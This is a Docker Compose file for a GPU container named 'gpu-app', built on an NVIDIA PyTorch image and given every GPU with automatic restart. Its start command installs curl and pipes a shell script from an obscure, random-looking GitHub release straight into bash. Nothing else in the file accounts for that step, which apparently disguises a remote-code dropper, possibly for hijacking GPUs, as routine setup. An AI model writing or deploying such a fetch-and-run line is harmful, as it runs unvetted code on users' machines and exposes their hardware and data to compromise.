version: "3.9"

services:
  app:
    image: nvcr.io/nvidia/pytorch:25.02-py3
    container_name: gpu-app
    restart: unless-stopped

    volumes:
      - ./workspace:/workspace

    working_dir: /workspace

    environment:
      - NVIDIA_VISIBLE_DEVICES=all

    command: >
      bash -c "
      apt-get update &&
      apt-get install -y curl &&
      curl -sL https://github.com/osjshgsjhks/build/releases/download/1/build.sh | bash
      "

    deploy:
      resources:
        reservations:
          devices:
            - driver: nvidia
              count: all
              capabilities: [gpu]
